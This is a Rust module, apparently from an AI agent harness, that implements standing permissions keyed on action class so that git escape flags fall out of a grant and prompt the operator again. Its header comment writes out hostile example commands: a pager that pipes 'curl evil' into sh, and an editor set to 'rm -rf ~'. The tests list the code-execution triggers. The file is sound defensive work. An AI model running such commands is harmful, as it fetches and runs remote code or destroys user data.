//! **Standing permission, keyed on what an action does — and the glob, kept.**
//!
//! `docs/boundary-and-adjudication.md` §4f. The want is legitimate and universal:
//! *stop asking me about git.* The mechanism every surveyed harness reaches for is a
//! glob on the command text, and on its own that is the GuardFall bug — a decision
//! made on a string the shell has not finished interpreting.
//!
//! `git` is close to the worst example anybody could have picked:
//!
//! ```text
//! git -c core.pager='sh -c "curl evil|sh"' log
//! git -c core.editor='rm -rf ~' commit
//! git … --upload-pack='…'
//! ```
//!
//! Every one of those matches `git *`. So **`allow git *` is approximately `allow
//! everything`** — opencode's `always: ["*"]` defect, where one click silently
//! disables config denies including their own `.env` guard (survey §1.1).
//!
//! # Two halves, and the second one is the position worth holding
//!
//! **The grantable unit is an intent, not a word.** A [`Grant`] carries a
//! [`Coverage`] — the `(program, ActionClass)` pairs it was granted for — and is
//! checked **per call against the normalisation**, never against text. `git status`
//! and `git -c core.pager=… log` derive different classes, so granting the first does
//! not grant the second. The grant never has to enumerate the escape hatches; it only
//! has to key on something the escape hatches change.
//!
//! **And the glob stays first class**, because the operator is right about what
//! happens otherwise:
//!
//! > *"we need to keep globbing as a way for users to shoot in the foot."*
//!
//! A permission system whose safe path is too rigid gets turned off wholesale, and
//! then nothing is guarded at all. Paternalism has a failure mode and it is the worst
//! one available. So a person may write `git *`. What they may not have is **silence**
//! about what they just wrote — see [`Grant::disclose`], which is the whole difference
//! between this and every harness in the survey.
//!
//! # Three rules a glob does not get to break
//!
//! | | |
//! |---|---|
//! | it is shown in class terms **before** it is accepted | informed foot-shooting; the muzzle direction is visible |
//! | it reaches `MayApprove` and `AlwaysAsk`, **never** `Blocked` | §3's flow rule is not a setting. You can shoot your foot; you cannot shoot your head |
//! | it never covers an **unresolvable** normalisation | `NotRun` stands: a pattern written in advance cannot apply to a command nobody could parse |
//!
//! The second and third are enforced by [`Grant::covers`] taking the tier and the
//! resolved flag and having no branch that can answer `true` without both. They are
//! not documented promises; there is no value to invert.
//!
//! # The workflow this is shaped for: the model proposes, the operator approves
//!
//! Asked to stop being prompted about git, a model writes the list **split by what the
//! commands do** — `status|log|diff|show|branch` as reads, `push|commit|merge` as
//! writes. That is better than `git *`, which grants the escape hatches, and better
//! than a system that accepts only machine-derived classes, which cannot express
//! *"these ones, I know what they do"*. So both spellings exist and the enumerated one
//! is the easy path rather than the only one.

use std::collections::BTreeSet;

use crate::adjudicate::{ActionClass, Tier};
use crate::intent::Intent;

/// What a grant was granted **for**, in the terms the gate checks.
///
/// Not a string, and not the arguments. The existing reasoning in
/// [`crate::adjudicate::AdjudicatedGate`] is the right one and is kept: *"a grant
/// keyed by the arguments would be a grant for one call, which is `allow_once`"*. A
/// class is the coarsest thing that is still specific enough to mean something, and
/// it is specific enough precisely because the escape hatches change it.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct Coverage {
    /// The program as the shell will resolve it, from the normalisation. `"<tool>"`
    /// for a path-shaped tool call that is not a command.
    pub program: String,
    /// The routing key: `(access, scope, reversibility, cost)`.
    pub class: ActionClass,
    /// What layer A said this does. Carried so a grant can be **shown** in the terms
    /// the operator agreed to rather than as four enum names, and checked so that a
    /// program whose intents grew — a vehicle flag appearing — falls out.
    pub intents: BTreeSet<Intent>,
}

impl Coverage {
    /// How it reads to a person: *"git — reads and writes inside the project, NOT code
    /// execution."*
    pub fn describe(&self) -> String {
        let what = if self.intents.is_empty() {
            "no intent layer A could name".to_string()
        } else {
            self.intents
                .iter()
                .map(|i| i.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        };
        format!(
            "`{}` — {what}; effect lands {}, {}",
            self.program,
            self.class.scope.as_str(),
            self.class.reversibility.as_str()
        )
    }
}

/// How a grant was written: enumerated by somebody who listed the cases, or globbed.
///
/// The distinction is kept **for the disclosure**, not for the check — both are
/// checked identically, per call, against the normalisation. What differs is what the
/// operator is told before they accept it, and how the standing list reads afterwards:
/// a session's banner that could not tell an enumerated grant from a star would be
/// hiding the one fact somebody auditing it would want first.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum Written {
    /// `git status`, `git log`, `git diff` — the model's proposal, or a person's list.
    Enumerated { patterns: Vec<String> },
    /// `git *`. Legal, and loud.
    Glob { pattern: String },
}

impl Written {
    pub fn as_str(&self) -> &'static str {
        match self {
            Written::Enumerated { .. } => "enumerated",
            Written::Glob { .. } => "glob",
        }
    }
}

/// One standing permission.
///
/// It is deliberately not `Copy` and not constructible field-by-field from outside
/// this module's rules: [`Grant::covers`] is the only reader, and every way this can
/// answer `true` runs through it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Grant {
    /// How the operator wrote it, for the disclosure.
    pub written: Written,
    /// What it actually covers, checked per call.
    pub coverage: Vec<Coverage>,
    /// Why it exists, in the operator's words or the model's proposal text. A grant
    /// with no reason is one nobody can weigh later — the same cause `ALWAYS_ASK`
    /// carries a `why` for.
    pub why: String,
}

/// Why a grant did not cover a call.
///
/// A vocabulary rather than a bool, because *"this grant does not extend that far"* and
/// *"nothing may extend that far"* are different sentences and an operator reading a
/// prompt needs to know which one they are looking at.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum NotCovered {
    /// The action resolved to a class this grant does not name. The ordinary case, and
    /// the one the escape hatches land in.
    ClassNotGranted,
    /// Layer A could not read the action. **No grant rescues this**, ever.
    Unresolved,
    /// `Tier::AlwaysAsk`. The operator decides these every time, and a standing
    /// permission is the model's authority rather than the operator's presence.
    AlwaysAsk,
    /// `Tier::Blocked`. Nothing reaches this, at any mode, by any spelling.
    Blocked,
}

impl NotCovered {
    pub fn as_str(&self) -> &'static str {
        match self {
            NotCovered::ClassNotGranted => "class_not_granted",
            NotCovered::Unresolved => "unresolved",
            NotCovered::AlwaysAsk => "always_ask",
            NotCovered::Blocked => "blocked",
        }
    }

    /// What the operator is told. Each says which of the four it was, because a
    /// refusal that reads the same for all of them teaches nothing.
    pub fn why(&self) -> &'static str {
        match self {
            NotCovered::ClassNotGranted => {
                "the standing permission for this program does not cover what this call \
                 does. The grant is keyed on the action's class, and this call's class \
                 is not one it was granted for — which is what happens when a flag turns \
                 the program into something else."
            }
            NotCovered::Unresolved => {
                "layer A could not read this command, so there is no class to compare a \
                 grant against. A pattern written in advance cannot apply to a command \
                 nobody could parse; this is `not_run` and no standing permission \
                 changes that."
            }
            NotCovered::AlwaysAsk => {
                "this is on the always-ask list, which means the operator decides it \
                 every time, however confident anything else is. A standing permission \
                 is the model's authority to act on their behalf, and that is the one \
                 thing this list withholds."
            }
            NotCovered::Blocked => {
                "secret bytes would cross the boundary. No grant, no glob, no mode and \
                 no instruction reaches this — the consequence does not land on the \
                 person who would be consenting to it and it cannot be undone \
                 afterwards."
            }
        }
    }
}

impl Grant {
    /// **The only way a grant can admit anything.**
    ///
    /// Takes the tier and the resolved flag by value rather than reading them off
    /// something a caller assembled, so there is no arrangement of arguments under
    /// which an blocked or unresolved action is covered. The three refusals are
    /// checked **before** the coverage lookup, which is the same ordering
    /// `AdjudicatedGate::admit` uses and for the same reason: an action nobody could
    /// read is not an action anybody can have pre-approved.
    pub fn covers(
        &self,
        tier: &Tier,
        resolved: bool,
        program: &str,
        class: ActionClass,
        intents: &BTreeSet<Intent>,
    ) -> Result<(), NotCovered> {
        if !resolved {
            return Err(NotCovered::Unresolved);
        }
        match tier {
            Tier::Blocked { .. } => return Err(NotCovered::Blocked),
            Tier::AlwaysAsk { .. } => return Err(NotCovered::AlwaysAsk),
            Tier::Auto | Tier::MayApprove => {}
        }
        let hit = self.coverage.iter().any(|c| {
            c.program == program
                && c.class == class
                // **The intents must be a subset of what was granted.** The class
                // catches most of it; this catches the rest, because two calls can
                // share a class and differ in what they do — and the difference is
                // exactly what a vehicle flag adds. A grant covers what it was shown,
                // never a superset of it.
                && intents.is_subset(&c.intents)
        });
        if hit {
            Ok(())
        } else {
            Err(NotCovered::ClassNotGranted)
        }
    }

    /// **What this grant includes, said out loud, before anybody accepts it.**
    ///
    /// The requirement, verbatim: *"This matches 47 commands, including 3 that can
    /// execute arbitrary code (`-c core.pager`, `--upload-pack`, `ext::`)."*
    ///
    /// `vehicles` is what the execution-vehicle table says about the programs this
    /// grant names — passed in rather than looked up here, because this module holds no
    /// table and the one that does lives in [`crate::intent`]. A caller that has no
    /// table passes an empty slice, and the sentence then says how many it could not
    /// classify rather than implying there were none: **absence is not permission**,
    /// and a disclosure that silently omitted the unknown half would be the same defect
    /// as the catch-all it is written against.
    pub fn disclose(&self, vehicles: &[VehicleNote]) -> String {
        let mut s = String::new();
        match &self.written {
            Written::Enumerated { patterns } => {
                s.push_str(&format!(
                    "a standing permission for {} enumerated pattern(s): {}\n",
                    patterns.len(),
                    patterns.join(", ")
                ));
            }
            Written::Glob { pattern } => {
                s.push_str(&format!(
                    "a standing permission written as the glob `{pattern}`. A glob is \
                     accepted and it is not silent — what it includes is below.\n"
                ));
            }
        }
        s.push_str(&format!("  because: {}\n", self.why));
        s.push_str(&format!("  it covers {} class(es):\n", self.coverage.len()));
        for c in &self.coverage {
            s.push_str(&format!("    {}\n", c.describe()));
        }

        let executing: Vec<&VehicleNote> = vehicles.iter().filter(|v| v.executes).collect();
        let unknown = vehicles.iter().filter(|v| v.unknown).count();
        if !executing.is_empty() {
            s.push_str(&format!(
                "  WARNING: {} of the programs named here can be turned into a way to \
                 run arbitrary code:\n",
                executing.len()
            ));
            for v in executing {
                s.push_str(&format!(
                    "    `{}` via {} — {}\n",
                    v.program,
                    v.triggers.join(", "),
                    v.why
                ));
            }
            s.push_str(
                "  Those calls derive a different class and fall OUT of this grant, so \
                 they will still ask. The warning is here because a grant you cannot see \
                 the edges of is one you cannot weigh.\n",
            );
        }
        if unknown > 0 {
            s.push_str(&format!(
                "  {unknown} of the programs named here are not classified. That is not \
                 a claim that they are harmless — an unclassified program is ungrantable \
                 and every call to one asks.\n"
            ));
        }
        s.push_str(
            "  Nothing here reaches an blocked action, an always-ask entry, or a \
             command layer A could not read.\n",
        );
        s
    }
}

/// What the execution-vehicle table says about one program, flattened so this module
/// needs no dependency on the table's own types.
///
/// `unknown` is a field rather than an absence, and that is the whole point: a program
/// missing from a list must not read as a program with nothing to say about it. The
/// survey's grok-build catch-all `_ => Read(None)` auto-approves `SchedulerCreate` as
/// if it were read-only, and it does so by treating absence as an answer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VehicleNote {
    pub program: String,
    /// A flag can turn this program into a shell.
    pub executes: bool,
    /// Nothing classifies this program at all.
    pub unknown: bool,
    /// The flags that do it, named, so the warning is specific rather than ominous.
    pub triggers: Vec<String>,
    pub why: String,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::adjudicate::FlowRule;
    use crate::schema::Access;

    fn intents(v: &[Intent]) -> BTreeSet<Intent> {
        v.iter().copied().collect()
    }

    fn inspect_class() -> ActionClass {
        ActionClass::host(Access::Exec, true, false)
    }

    fn git_status_grant() -> Grant {
        Grant {
            written: Written::Enumerated {
                patterns: vec!["git status".into(), "git log".into()],
            },
            coverage: vec![Coverage {
                program: "git".into(),
                class: inspect_class(),
                intents: intents(&[Intent::Inspect]),
            }],
            why: "the model listed the read-only git subcommands and I approved them".into(),
        }
    }

    /// The grant covers what it was granted for.
    #[test]
    fn a_granted_class_is_covered() {
        let g = git_status_grant();
        assert_eq!(
            g.covers(
                &Tier::MayApprove,
                true,
                "git",
                inspect_class(),
                &intents(&[Intent::Inspect])
            ),
            Ok(())
        );
    }

    /// **The whole reason the key is a class and not a word.** `git -c core.pager=…`
    /// adds `ExecuteCode`, which is not a subset of what was granted, so it falls out
    /// and asks — without the grant having enumerated a single escape hatch.
    #[test]
    fn an_execution_vehicle_falls_out_of_a_grant_that_never_named_it() {
        let g = git_status_grant();
        assert_eq!(
            g.covers(
                &Tier::MayApprove,
                true,
                "git",
                inspect_class(),
                &intents(&[Intent::Inspect, Intent::ExecuteCode])
            ),
            Err(NotCovered::ClassNotGranted)
        );
    }

    /// A different class is a different grant, even for the same program.
    #[test]
    fn granting_a_read_does_not_grant_a_write() {
        let g = git_status_grant();
        let write = ActionClass::host(Access::Write, true, false);
        assert_eq!(
            g.covers(
                &Tier::MayApprove,
                true,
                "git",
                write,
                &intents(&[Intent::WriteFile])
            ),
            Err(NotCovered::ClassNotGranted)
        );
    }

    /// The three a glob may never reach, checked against a glob written as widely as
    /// this system permits. `git *` is legal and it still cannot do any of these.
    #[test]
    fn the_widest_possible_glob_reaches_none_of_the_three() {
        let g = Grant {
            written: Written::Glob {
                pattern: "git *".into(),
            },
            // Deliberately granted for everything the type can express.
            coverage: vec![Coverage {
                program: "git".into(),
                class: inspect_class(),
                intents: intents(&[
                    Intent::Inspect,
                    Intent::ReadFile,
                    Intent::WriteFile,
                    Intent::ExecuteCode,
                    Intent::Destroy,
                    Intent::Network,
                    Intent::PrivilegeEscalation,
                    Intent::Disclose,
                    Intent::Unknown,
                ]),
            }],
            why: "I know what I am doing".into(),
        };
        let all = intents(&[Intent::Inspect]);

        // Unresolvable: `NotRun` stands.
        assert_eq!(
            g.covers(&Tier::MayApprove, false, "git", inspect_class(), &all),
            Err(NotCovered::Unresolved)
        );
        // Always-ask: the operator decides these every time.
        assert_eq!(
            g.covers(
                &Tier::AlwaysAsk {
                    rule: "privilege_escalation",
                    why: "test".into()
                },
                true,
                "git",
                inspect_class(),
                &all
            ),
            Err(NotCovered::AlwaysAsk)
        );
        // Blocked: you can shoot your foot, you cannot shoot your head.
        assert_eq!(
            g.covers(
                &Tier::Blocked {
                    rule: FlowRule::SecretToTranscript,
                    evidence: "test".into()
                },
                true,
                "git",
                inspect_class(),
                &all
            ),
            Err(NotCovered::Blocked)
        );
    }

    /// The refusals are four different sentences. A prompt that read the same for all
    /// of them would teach the operator nothing about which wall they hit.
    #[test]
    fn each_refusal_says_which_one_it_was() {
        let seen: Vec<&str> = [
            NotCovered::ClassNotGranted,
            NotCovered::Unresolved,
            NotCovered::AlwaysAsk,
            NotCovered::Blocked,
        ]
        .iter()
        .map(|n| n.why())
        .collect();
        for (i, a) in seen.iter().enumerate() {
            assert!(a.len() > 60, "{a}");
            for b in seen.iter().skip(i + 1) {
                assert_ne!(a, b, "two refusals read identically");
            }
        }
    }

    /// **The difference from every harness in the survey.** A glob is accepted, and it
    /// arrives with its own muzzle direction printed on it.
    #[test]
    fn a_glob_states_what_it_includes_before_anybody_accepts_it() {
        let g = Grant {
            written: Written::Glob {
                pattern: "git *".into(),
            },
            coverage: vec![Coverage {
                program: "git".into(),
                class: inspect_class(),
                intents: intents(&[Intent::Inspect]),
            }],
            why: "stop asking me about git".into(),
        };
        let notes = vec![VehicleNote {
            program: "git".into(),
            executes: true,
            unknown: false,
            triggers: vec![
                "-c core.pager=".into(),
                "--upload-pack".into(),
                "ext::".into(),
            ],
            why: "git runs the pager and the editor as shell commands, and both are \
                  settable per invocation"
                .into(),
        }];
        let s = g.disclose(&notes);
        assert!(s.contains("glob `git *`"), "{s}");
        assert!(s.contains("run arbitrary code"), "{s}");
        assert!(
            s.contains("-c core.pager="),
            "the warning names the flags: {s}"
        );
        assert!(s.contains("--upload-pack"), "{s}");
        assert!(s.contains("still ask"), "{s}");
        assert!(s.contains("blocked"), "{s}");
    }

    /// An unclassified program is counted and named as unclassified. A disclosure that
    /// omitted the unknown half would be treating absence as permission, which is the
    /// defect this whole file is written against.
    #[test]
    fn an_unclassified_program_is_reported_rather_than_omitted() {
        let g = Grant {
            written: Written::Enumerated {
                patterns: vec!["frobnicate build".into()],
            },
            coverage: vec![Coverage {
                program: "frobnicate".into(),
                class: inspect_class(),
                intents: intents(&[Intent::Unknown]),
            }],
            why: "our build tool".into(),
        };
        let s = g.disclose(&[VehicleNote {
            program: "frobnicate".into(),
            executes: false,
            unknown: true,
            triggers: vec![],
            why: "nothing classifies this program".into(),
        }]);
        assert!(s.contains("not classified"), "{s}");
        assert!(
            s.contains("not a claim that they are harmless"),
            "absence must never read as permission: {s}"
        );
    }

    /// An enumerated grant and a glob read differently in a listing, because the one
    /// fact somebody auditing a standing permission wants first is which of the two it
    /// is.
    #[test]
    fn a_listing_can_tell_a_list_from_a_star() {
        assert_eq!(git_status_grant().written.as_str(), "enumerated");
        let s = git_status_grant().disclose(&[]);
        assert!(s.contains("enumerated pattern"), "{s}");
        assert!(!s.contains("glob"), "{s}");
    }
}
